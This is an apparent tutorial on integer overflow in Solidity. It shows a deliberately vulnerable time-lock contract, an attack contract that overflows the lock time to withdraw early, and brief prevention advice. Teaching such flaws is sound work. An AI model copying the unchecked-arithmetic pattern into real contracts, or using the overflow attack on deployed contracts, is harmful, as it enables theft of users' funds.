# Overflow and Underflow
Overflow occurs when an unsigned integer (uint) reaches its byte size. Then the next element added will return the first variable element.

Let’s say we have a uint256, which can only have 256 bits. That means the largest number we can store is 2^256 - 1 in decimal.

Consider the code below.
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.

When the user deposits in the deposit contract above, the funds get locked for 1 week after which the user can withdraw.
In the deposit contract, a function has been provided to increase the timelock for the deposited fund.

When the attacker calls the withdraw function inside the deposit contract from the attack contract, the attacker can withdraw without reaching the time the funds are available for withdrawal by passing a huge number to inceaseLockTime function and therefore causing overflow.

How to prevent Over-flow
Use SafeMath to will prevent arithmetic overflow and underflow
Solidity 0.8 defaults to throwing an error for overflow / underflow

